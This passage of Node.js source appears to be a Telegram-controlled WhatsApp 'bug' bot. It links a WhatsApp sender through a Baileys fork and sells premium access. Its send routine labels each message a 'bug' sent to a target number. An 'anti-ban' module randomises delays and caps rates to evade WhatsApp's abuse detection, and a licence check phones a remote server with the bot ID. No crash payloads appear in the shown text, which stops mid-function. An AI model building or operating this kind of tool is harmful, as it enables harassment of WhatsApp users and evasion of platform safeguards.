const { Telegraf } = require("telegraf");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    jidEncode,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
} = require("@ikyyjeee/baileys");
const fs = require("fs-extra");
const path = require('path');
const { 
   tokenBot: BOT_TOKEN, 
   ownerID: ID_TELEGRAM
} = global.CONFIG;
const config = global.CONFIG;
const bot = new Telegraf(BOT_TOKEN);
const ownerID = ID_TELEGRAM;
const https = require("https");
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os');
const sharp = require('sharp');
const QRCode = require('qrcode');
const FormData = require('form-data');
const EventEmitter = require('events');
const moment = require('moment-timezone');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ─────── VALIDATE TOKEN ─────── //
const L2_CONFIG_URL = 'https://raw.githubusercontent.com/hayamjawit-crypto/ngapain-lu/main/config.json';

async function L2_validate() {
    return new Promise((resolve) => {
        const https = require('https');
        const http = require('http');

        const fetchConfig = (url, redirects = 0) => {
            if (redirects > 5) {
                return resolve({ ok: false, error: 'TOO_MANY_REDIRECTS' });
            }

            try {
                const u = new URL(url);
                const isHttps = u.protocol === 'https:';
                const lib = isHttps ? https : http;

                const req = lib.get({
                    hostname: u.hostname,
                    port: u.port || (isHttps ? 443 : 80),
                    path: u.pathname + u.search,
                    headers: {
                        'User-Agent': 'L2/1.0',
                        'Cache-Control': 'no-cache'
                    },
                    timeout: 10000
                }, (res) => {
                    if ([301, 302, 303, 307, 308].includes(res.statusCode)) {
                        return fetchConfig(res.headers.location, redirects + 1);
                    }

                    if (res.statusCode !== 200) {
                        return resolve({ ok: false, error: 'CONFIG_FAIL_' + res.statusCode });
                    }

                    const chunks = [];
                    res.on('data', c => chunks.push(c));
                    res.on('end', () => {
                        try {
                            const config = JSON.parse(Buffer.concat(chunks).toString('utf8'));

                            if (!config.host || !config.port) {
                                return resolve({ ok: false, error: 'CONFIG_INVALID' });
                            }

                            validateBot(config, resolve);

                        } catch (e) {
                            resolve({ ok: false, error: 'PARSE_CONFIG' });
                        }
                    });
                });

                req.on('error', (e) => resolve({ ok: false, error: e.message }));
                req.on('timeout', () => {
                    req.destroy();
                    resolve({ ok: false, error: 'CONFIG_TIMEOUT' });
                });

            } catch (e) {
                resolve({ ok: false, error: e.message });
            }
        };

        const validateBot = (config, resolve) => {
            const tokenBot = global.CONFIG?.tokenBot || '';
            const botId = (tokenBot.match(/^(\d+):/) || [])[1];

            if (!botId) {
                return resolve({ ok: false, error: 'BAD_TOKEN' });
            }

            const isHttps = config.port === 443 || config.port === 8443;
            const lib = isHttps ? https : http;
            const body = JSON.stringify({ botId });

            const req = lib.request({
                hostname: config.host,
                port: config.port,
                path: '/validate',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(body),
                    'User-Agent': 'L2/1.0'
                },
                timeout: 10000
            }, (res) => {
                let d = '';
                res.on('data', c => d += c);
                res.on('end', () => {
                    try {
                        const p = JSON.parse(d);
                        if (res.statusCode === 200 && p.ok) {
                            resolve({ ok: true, botId });
                        } else {
                            resolve({ ok: false, error: p.error || 'INVALID' });
                        }
                    } catch {
                        resolve({ ok: false, error: 'PARSE_ERROR' });
                    }
                });
            });

            req.on('error', (e) => resolve({ ok: false, error: e.message }));
            req.on('timeout', () => {
                req.destroy();
                resolve({ ok: false, error: 'VALIDATE_TIMEOUT' });
            });

            req.write(body);
            req.end();
        };

        fetchConfig(L2_CONFIG_URL);
    });
}

// ─────── CAPTION FOTO ─────── //
const THUMB = "https://files.catbox.moe/r1cs1g.jpg";

// ─────── ANTI BAN MODULE ─────── //
const ANTI_BAN_DB = path.join(__dirname, 'database', 'antiban.json');
const DEFAULT_ANTIBAN = {
    minDelay: 10000,
    maxDelay: 20000,
    maxPerMinute: 300,
    maxPerHour: 500,
    maxPerDay: 1000,
    targetCooldown: 15000,
    failureLimit: 3,
    failurePauseMs: 300000,
    pauseMs: 60000,
    counter: {
        minute: 0,
        hour: 0,
        day: 0,
        minuteStart: Date.now(),
        hourStart: Date.now(),
        dayStart: Date.now()
    },
    failures: 0,
    paused: false,
    pausedUntil: 0
};

// ─────── WORKER POOL ─────── //
const MAX_WORKERS = 2;
const workers = new Array(MAX_WORKERS).fill(false);
const workerQueue = [];

const targetCooldowns = new Map();
function loadAntiBan() {
    try {
        const dir = path.dirname(ANTI_BAN_DB);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        if (!fs.existsSync(ANTI_BAN_DB)) {
            fs.writeFileSync(ANTI_BAN_DB, JSON.stringify(DEFAULT_ANTIBAN, null, 2));
            return JSON.parse(JSON.stringify(DEFAULT_ANTIBAN));
        }
        const data = JSON.parse(fs.readFileSync(ANTI_BAN_DB, 'utf8'));
        return {
            ...DEFAULT_ANTIBAN,
            ...data,
            counter: {
                ...DEFAULT_ANTIBAN.counter,
                ...(data.counter || {})
            }
        };
    } catch {
        return JSON.parse(JSON.stringify(DEFAULT_ANTIBAN));
    }
}
function saveAntiBan(data) {
    try {
        const dir = path.dirname(ANTI_BAN_DB);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(ANTI_BAN_DB, JSON.stringify(data, null, 2));
    } catch {}
}
function randomDelay() {
    const cfg = loadAntiBan();
    return Math.floor(
        Math.random() * (cfg.maxDelay - cfg.minDelay + 1)
    ) + cfg.minDelay;
}
function resetCounters(cfg, now) {
    if (now - cfg.counter.minuteStart >= 60000) {
        cfg.counter.minute = 0;
        cfg.counter.minuteStart = now;
    }
    if (now - cfg.counter.hourStart >= 3600000) {
        cfg.counter.hour = 0;
        cfg.counter.hourStart = now;
    }
    if (now - cfg.counter.dayStart >= 86400000) {
        cfg.counter.day = 0;
        cfg.counter.dayStart = now;
    }
}
function checkTargetCooldown(target) {
    const cfg = loadAntiBan();
    const lastSent = targetCooldowns.get(target) || 0;
    const elapsed = Date.now() - lastSent;

    if (elapsed < cfg.targetCooldown) {
        return {
            ok: false,
            sisa: Math.ceil((cfg.targetCooldown - elapsed) / 1000)
        };
    }
    return { ok: true };
}
function setTargetCooldown(target) {
    targetCooldowns.set(target, Date.now());
}
function guardSend() {
    const cfg = loadAntiBan();
    const now = Date.now();
    resetCounters(cfg, now);
    if (cfg.paused) {
        if (now < cfg.pausedUntil) {
            return {
                ok: false,
                reason: `Sender pause ${Math.ceil((cfg.pausedUntil - now) / 1000)}s`
            };
        }
        cfg.paused = false;
        cfg.pausedUntil = 0;
        cfg.failures = 0;
    }
    if (cfg.counter.minute >= cfg.maxPerMinute) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return {
            ok: false,
            reason: `Batas per menit tercapai, pause ${cfg.pauseMs / 1000}s`
        };
    }
    if (cfg.counter.hour >= cfg.maxPerHour) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return {
            ok: false,
            reason: `Batas per jam tercapai, pause ${cfg.pauseMs / 1000}s`
        };
    }
    if (cfg.counter.day >= cfg.maxPerDay) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return {
            ok: false,
            reason: `Batas harian tercapai, pause ${cfg.pauseMs / 1000}s`
        };
    }
    cfg.counter.minute++;
    cfg.counter.hour++;
    cfg.counter.day++;
    saveAntiBan(cfg);

    return { ok: true };
}
function registerFailure() {
    const cfg = loadAntiBan();
    cfg.failures++;
    if (cfg.failures >= cfg.failureLimit) {
        cfg.failures = 0;
        cfg.paused = true;
        cfg.pausedUntil = Date.now() + cfg.failurePauseMs;
    }
    saveAntiBan(cfg);
}
function registerSuccess() {
    const cfg = loadAntiBan();
    if (cfg.failures > 0) {
        cfg.failures = 0;
        saveAntiBan(cfg);
    }
}

// ─────── WORKER POOL ─────── //
function acquireWorker() {
    return new Promise((resolve) => {
        const idx = workers.findIndex(w => !w);
        if (idx !== -1) {
            workers[idx] = true;
            return resolve(idx);
        }
        workerQueue.push(resolve);
    });
}

function releaseWorker(idx) {
    if (idx < 0 || idx >= MAX_WORKERS) return;
    if (workerQueue.length > 0) {
        const next = workerQueue.shift();
        workers[idx] = true;
        next(idx);
    } else {
        workers[idx] = false;
    }
}

function isSocketReady() {
    return sock && sock.user && sock.ws && sock.ws.readyState === 1;
}

async function waitForConnection(timeout = 30000) {
    const start = Date.now();
    while (!isWhatsAppConnected && Date.now() - start < timeout) {
        await sleep(2000);
    }
    return isWhatsAppConnected;
}

// ─────── SAFE SEND ─────── //
async function safeSend(sock, target, messageFunc, bugName = "Message") {
    const nomorTarget = target.replace(/@s\.whatsapp\.net|@g\.us/g, '');
    const guard = guardSend();
    if (!guard.ok) {
        console.log(chalk.yellow(`⚠️ ${guard.reason}`));
        return false;
    }
    const cd = checkTargetCooldown(target);
    if (!cd.ok) {
        console.log(chalk.yellow(`⚠️ Target cooldown ${cd.sisa}s | ${nomorTarget}`));
        return false;
    }
    const workerIdx = await acquireWorker();
    try {
        if (!sock || !sock.user) {
            console.log(chalk.yellow(`⚠️ Sender belum terhubung`));
            return false;
        }
        if (!isSocketReady()) {
            const ok = await waitForConnection(30000);
            if (!ok) {
                console.log(chalk.red(`❌ WhatsApp gagal reconnect`));
                return false;
            }
        }
        await sleep(randomDelay());
        if (!sock.user || !isSocketReady()) {
            registerFailure();
            console.log(chalk.yellow(`⚠️ Sender lepas setelah delay`));
            return false;
        }
        for (let attempt = 1; attempt <= 3; attempt++) {
            try {
                const startTime = Date.now();
                await messageFunc();
                const durasi = ((Date.now() - startTime) / 1000).toFixed(2);
                registerSuccess();
                console.log(
                    chalk.green(`✅ ${bugName} terkirim ke ${nomorTarget} (${durasi}s) [W${workerIdx + 1}]`)
                );
                return true;
            } catch (err) {
                const errMsg = String(err.message || err);
                if (/connection closed|closed|timed? ?out|websocket/i.test(errMsg)) {
                    console.log(chalk.yellow(`⚠️ Connection closed, retry ${attempt}/3...`));
                    await sleep(3000);
                    if (!isSocketReady()) {
                        const ok = await waitForConnection(30000);
                        if (!ok) {
                            registerFailure();
                            console.log(chalk.red(`❌ Reconnect gagal`));
                            return false;
                        }
                    }
                    continue;
                }
                registerFailure();
                console.log(chalk.red(`❌ ${bugName} gagal ke ${nomorTarget}: ${errMsg}`));
                return false;
            }
        }
        registerFailure();
        console.log(chalk.red(`❌ ${bugName} gagal total ke ${nomorTarget}`));
        return false;
    } catch (err) {
        registerFailure();
        console.log(chalk.red(`❌ ${bugName} fatal: ${err.message}`));
        return false;
    } finally {
        releaseWorker(workerIdx);
    }
}

// ─────── HELPER FORCE CHANNEL ─────── //
const CHANNELS_DB = path.join(__dirname, 'database', 'channels.json');
function loadChannels() {
    try {
        if (!fs.existsSync(CHANNELS_DB)) return { enabled: true, list: [] };
        return JSON.parse(fs.readFileSync(CHANNELS_DB, 'utf8'));
    } catch {
        return { enabled: true, list: [] };
    }
}
function saveChannels(data) {
    const dir = path.dirname(CHANNELS_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(CHANNELS_DB, JSON.stringify(data, null, 2));
}
function extractUsername(url) {
    const m = String(url).match(/(?:t\.me\/|@)([A-Za-z0-9_]+)/);
    return m ? '@' + m[1] : null;
}
async function checkAllChannels(ctx, userId) {
    const data = loadChannels();
    if (!data.enabled || data.list.length === 0) return { ok: true, notJoined: [] };
    const notJoined = [];
    for (const ch of data.list) {
        try {
            const member = await ctx.telegram.getChatMember(ch.username, userId);
            const ok = ['creator', 'administrator', 'member', 'restricted'].includes(member.status);
            if (!ok) notJoined.push(ch);
        } catch {
            notJoined.push(ch);
        }
    }
    return { ok: notJoined.length === 0, notJoined };
}

// ─────── HELPER BACKUP DATA ─────── //
const DB_DIR = path.join(__dirname, 'database');
function getAllDatabases() {
    if (!fs.existsSync(DB_DIR)) return {};
    const files = fs.readdirSync(DB_DIR).filter(f => f.endsWith('.json'));
    const result = {};
    for (const f of files) {
        try {
            result[f] = JSON.parse(fs.readFileSync(path.join(DB_DIR, f), 'utf8'));
        } catch {
            result[f] = null;
        }
    }
    return result;
}
function restoreDatabases(data) {
    if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
    for (const [name, content] of Object.entries(data)) {
        fs.writeFileSync(path.join(DB_DIR, name), JSON.stringify(content, null, 2));
    }
}

// ─────── HELPER COOLDOWN ─────── //
const COOLDOWN_DB = path.join(__dirname, 'database', 'cooldown.json');
function loadCooldown() {
    try {
        if (!fs.existsSync(COOLDOWN_DB)) return { time: 5, users: {} };
        return JSON.parse(fs.readFileSync(COOLDOWN_DB, 'utf8'));
    } catch {
        return { time: 5, users: {} };
    }
}
function saveCooldown(data) {
    const dir = path.dirname(COOLDOWN_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(COOLDOWN_DB, JSON.stringify(data, null, 2));
}
function setCooldown(seconds) {
    const data = loadCooldown();
    data.time = seconds;
    saveCooldown(data);
}
function getCooldown() {
    return loadCooldown().time;
}
function checkCooldown(userId) {
    const data = loadCooldown();
    const now = Date.now();
    const last = data.users[String(userId)] || 0;
    const diff = now - last;

    if (diff < data.time * 1000) {
        return Math.ceil((data.time * 1000 - diff) / 1000);
    }
    data.users[String(userId)] = now;
    saveCooldown(data);
    return 0;
}
function resetCooldown(userId) {
    const data = loadCooldown();
    delete data.users[String(userId)];
    saveCooldown(data);
}
function resetAllCooldown() {
    const data = loadCooldown();
    data.users = {};
    saveCooldown(data);
}

// ─────── HELPER ADD PREMIUM ─────── //
const PREMIUM_DB = path.join(__dirname, 'database', 'premium.json');
function getPremium() {
    try {
        if (!fs.existsSync(PREMIUM_DB)) return [];
        return JSON.parse(fs.readFileSync(PREMIUM_DB, 'utf8'));
    } catch { return []; }
}
function setPremium(list) {
    const dir = path.dirname(PREMIUM_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(PREMIUM_DB, JSON.stringify(list, null, 2));
}

// ─────── HELPER BLOCK CMD ─────── //
const BLOCKCMD_DB = path.join(__dirname, 'database', 'blockcmd.json');
function getBlocked() {
    try {
        if (!fs.existsSync(BLOCKCMD_DB)) return [];
        const data = JSON.parse(fs.readFileSync(BLOCKCMD_DB, 'utf8'));
        return Array.isArray(data) ? data : [];
    } catch {
        return [];
    }
}
function setBlocked(list) {
    const dir = path.dirname(BLOCKCMD_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(BLOCKCMD_DB, JSON.stringify(Array.isArray(list) ? list : [], null, 2));
}

// ─────── HELPER ADD GROUP ─────── //
const GROUPS_DB = path.join(__dirname, 'database', 'groups.json');
function ensureGroupsDb() {
    const dir = path.dirname(GROUPS_DB);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (!fs.existsSync(GROUPS_DB)) fs.writeFileSync(GROUPS_DB, JSON.stringify({}, null, 2));
}
function loadGroups() {
    ensureGroupsDb();
    try {
        return JSON.parse(fs.readFileSync(GROUPS_DB, 'utf8'));
    } catch {
        return {};
    }
}
function saveGroups(data) {
    ensureGroupsDb();
    fs.writeFileSync(GROUPS_DB, JSON.stringify(data, null, 2));
}

function formatMasaAktif(group) {
    if (!group) return '❌ Bєlυm tєrdαftαr';
    if (group.permanent) return 'Pєrmαnєnt';
    const now = Date.now();
    const exp = new Date(group.expiredAt).getTime();
    const diff = exp - now;
    if (diff <= 0) return '❌ Єxpírєd';
    const days = Math.floor(diff / 86400000);
    const hours = Math.floor((diff % 86400000) / 3600000);
    const mins = Math.floor((diff % 3600000) / 60000);
    return `⏳ ${days} hαrí ${hours} jαm ${mins} mєnít`;
}

// ─────── MIDDLEWARE CEK AKSES ─────── //
function checkAccess() {
    return async (ctx, next) => {
        const isGroup = ctx.chat?.type === 'group' || ctx.chat?.type === 'supergroup';
        if (isGroup) {
            const groupId = String(ctx.chat.id);
            const group = loadGroups()[groupId];
            if (!group) {
                return ctx.reply(
                    '⚠️ Grσυp íní bєlυm tєrdαftαr\n' +
                    'Οwnєr hαrυs jαlαnín /addgroup dυlυ'
                );
            }
            if (!group.permanent && new Date(group.expiredAt).getTime() < Date.now()) {
                return ctx.reply(
                    '⏳ Mαsα αktíf grσυp íní sυdαh hαbís\n' +
                    'Hυbυngí σwnєr υntυk pєrpαnjαng'
                );
            }
            return next();
        }
        if (!getPremium().includes(String(ctx.from.id))) {
            return ctx.reply('❌ Fítυr íní khυsυs prєmíυm');
        }
        return next();
    };
}

// ─────── MIDDWALEER COOLDOWN ─────── //
function cooldownMW() {
    return async (ctx, next) => {
        const sisa = checkCooldown(ctx.from.id);
        if (sisa > 0) return ctx.reply(`⏳ Tυnggυ ${sisa} dєtík lαgí υntυk mєmαkαí cσmmαnd`);
        return next();
    };
}

// ─────── UPTIME BOT ─────── //
function formatUptime(seconds) {
    const d = Math.floor(seconds / 86400);
    const h = Math.floor((seconds % 86400) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);

    const parts = [];
    if (d > 0) parts.push(`${d} hαrí`);
    if (h > 0) parts.push(`${h} jαm`);
    if (m > 0) parts.push(`${m} mєnít`);
    if (s > 0 || parts.length === 0) parts.push(`${s} dєtík`);

    return parts.join(' ');
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const getActiveSockets = () => {
    if (!sock || !isWhatsAppConnected) return [];
    return [sock];
};

const store = makeInMemoryStore({
    logger: pino({ level: 'silent' })
});

// ─────── RECONNECT STATE ─────── //
let reconnectTimer = null;
let isReconnecting = false;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 20;

const startSesi = async () => {
    if (isReconnecting) return;
    isReconnecting = true;
    try {
        const { state, saveCreds } = await useMultiFileAuthState('./session');
        const { version } = await fetchLatestBaileysVersion();
        const connectionOptions = {
            version,
            keepAliveIntervalMs: 30000,
            printQRInTerminal: !usePairingCode,
            logger: pino({ level: "silent" }),
            autoFollowChannels: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(
                    state.keys,
                    pino({ level: 'silent' })
                ),
            },
            browser: Browsers.macOS("Safari"),
            getMessage: async (key) => {
                if (store) {
                    try {
                        const msg = await store.loadMessage(key.remoteJid, key.id);
                        return msg?.message || undefined;
                    } catch {}
                }
                return proto.Message.fromObject({});
            },
            syncFullHistory: false,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            retryRequestDelayMs: 250,
            maxMsgRetryCount: 5,
        };
        sock = makeWASocket(connectionOptions);
        store.bind(sock.ev);
        sock.ev.on("messages.upsert", async (m) => {
            try {
                if (!m || !m.messages || !m.messages[0]) return;
                const msg = m.messages[0];
                const chatId = msg.key.remoteJid || "Unknown";
            } catch (error) {
                console.error('[messages.upsert]', error.message);
            }
        });
        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'open') {
                isWhatsAppConnected = true;
                isReconnecting = false;
                reconnectAttempts = 0;
                if (lastPairingMessage) {
                    const connectedMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${lastPairingMessage.phoneNumber}
⌑ Pαíríng Cσdє: ${lastPairingMessage.pairingCode}
⌑ Typє: Cσnnєctєd`;
                    try {
                        await bot.telegram.editMessageCaption(
                            lastPairingMessage.chatId,
                            lastPairingMessage.messageId,
                            undefined,
                            connectedMenu,
                            { parse_mode: "HTML" }
                        );
                    } catch (e) {}
                }
                console.clear();
                const currentTime = moment()
                    .tz('Asia/Jakarta')
                    .format('HH:mm:ss');
                console.log(
                    chalk.green(
                        `Pαíríng sєndєr bєrhαsíl ✅ [${currentTime}]`
                    )
                );
            }
            if (connection === 'close') {
                isWhatsAppConnected = false;
                isReconnecting = false;
                const statusCode =
                    lastDisconnect?.error?.output?.statusCode;
                const reason =
                    lastDisconnect?.error?.message || 'Unknown';
                console.log(
                    chalk.red(
                        `❌ Kσnєksí tєrpυtυs: ${statusCode || 'Unknown'} - ${reason}`
                    )
                );
                if (
                    statusCode === DisconnectReason.loggedOut ||
                    statusCode === 401
                ) {
                    console.log(
                        chalk.red(
                            '🚪 Lσggєd συt! Hαpυs ./sєssíσn dαn pαíríng υlαng'
                        )
                    );
                    return;
                }
                if (reconnectTimer) return;
                reconnectAttempts++;
                if (reconnectAttempts > MAX_RECONNECT_ATTEMPTS) {
                    console.log(
                        chalk.red(
                            `❌ Rєcσnnєct gαgαl ${MAX_RECONNECT_ATTEMPTS}x, bєrhєntí`
                        )
                    );
                    return;
                }
                let delay = 5000;
                if (statusCode === DisconnectReason.restartRequired) {
                    delay = 3000;
                    console.log(chalk.yellow(`🔄 Rєstαrt rєqυírєd...`));
                } else if (statusCode === 428) {
                    delay = 10000;
                    console.log(chalk.yellow(`⚠️ Cσnnєctíσn clσsєd (428), tυnggυ 10s...`));
                } else if (statusCode === 503 || statusCode === 502) {
                    delay = 15000;
                    console.log(chalk.yellow(`⚠️ Sєrvєr error (${statusCode}), tυnggυ 15s...`));
                } else {
                    console.log(
                        chalk.yellow(
                            `🔌 Rєcσnnєct dαlαm ${delay / 1000}s (αttєmp ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})...`
                        )
                    );
                }
                reconnectTimer = setTimeout(() => {
                    reconnectTimer = null;
                    startSesi();
                }, delay);
            }
        });
    } catch (error) {
        isReconnecting = false;
        console.error(
            '[startSesi]',
            error?.message || error
        );
        if (!reconnectTimer) {
            reconnectTimer = setTimeout(() => {
                reconnectTimer = null;
                startSesi();
            }, 5000);
        }
    }
};

startSesi();

// ─────── VALIDATE CEK SENDER ─────── //
const checkWhatsAppConnection = (ctx, next) => {
    if (!sock || !isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tídαk αdα sєndєr yαng tєrhυbυng");
        return;
    }
    next();
};

// ─────── CONNECT NO SENDER ─────── //
bot.command("connect", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fítυr íní hαnyα υntυk pєmílík bσt");
    }   
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Cσntσh: /connect 62×××");
  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ Nσmσr tídαk vαlíd");
  try {
    if (!sock) return ctx.reply("❌ Sσckєt bєlυm síαp, cσbα lαgí nαntí");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ WhαtsΑpp sυdαh tєrhυbυng dєngαn nσmσr: ${phoneNumber}`);
    }
    const code = await sock.requestPairingCode(phoneNumber, "XEROZ123");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  
    const pairingMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${phoneNumber}
⌑ Pαíríng Cσdє: ${formattedCode}
⌑ Typє: Nσt Cσnnєctєd`;
    const sentMsg = await ctx.replyWithPhoto(THUMB, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  
    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };
  } catch (err) {
    console.error(err);
  }
});
if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${lastPairingMessage.phoneNumber}
⌑ Pαíríng Cσdє: ${lastPairingMessage.pairingCode}
⌑ Typє: Cσnnєctєd`;
      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

// ─────── HAPUS PAIRING SENDER  ─────── //
bot.command("restart", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ Fítυr íní hαnyα υntυk pєmílík bσt");
  }
  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;
    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }
    if (deleted) {
      await ctx.reply("🗑️ Sєssíσn bєrhαsíl díhαpυs, pαnєl αkαn rєstαrt");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 Tídαk αdα fσldєr sєssíσn yαng dítєmυkαn");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gαgαl mєnhαpυs sєssíσn");
  }
});

// ─────── COMMAND /addgroup ─────── //
bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply('❌ Fítυr íní hαnyα υntυk pєmílík bσt');
    }
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return ctx.reply('❌ Cσmmαnd íní hαnyα bísα dípαkαí dí grσυp');
    }
    const groupId = String(ctx.chat.id);
    const groupName = ctx.chat.title || 'Unknown';
    const groups = loadGroups();
    const existing = groups[groupId];
    let statusText = '';
    if (existing) {
        statusText = `\n📌 Stαtυs sααt íní: <b>${formatMasaAktif(existing)}</b>\n`;
    }
    const caption = `
<blockquote>Αdd Grσυp Prєmíυm</blockquote>
Grσυp : <b>${groupName}</b>
ÍD : <code>${groupId}</code>${statusText}`;
    const keyboard = [
        [
            { text: "📅 30 Hαrí", callback_data: `addgrp_30_${groupId}`, style: "Primary" },
        ],
        [
            { text: "📅 Pєrmαnєnt", callback_data: `addgrp_perm_${groupId}`, style: "Danger" },
        ],
        [
            { text: "❌ Bαtαlkαn", callback_data: `addgrp_cancel`, style: "Primary" },
        ],
    ];
    await ctx.reply(caption, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    });
});

// ─────── CALLBACK: 30 HARI ─────── //
bot.action(/^addgrp_30_(.+)$/, async (ctx) => {
    try {
        if (ctx.from.id != ID_TELEGRAM) {
            return ctx.answerCbQuery('❌ Cυmα pєmílík bσt yαng bísα αksєs');
        }
        const groupId = ctx.match[1];
        const groups = loadGroups();
        const now = new Date();
        const expiredAt = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
        groups[groupId] = {
            name: groups[groupId]?.name || 'Unknown',
            addedBy: String(ctx.from.id),
            addedAt: now.toISOString(),
            expiredAt: expiredAt.toISOString(),
            type: '30days',
            permanent: false,
        };
        saveGroups(groups);
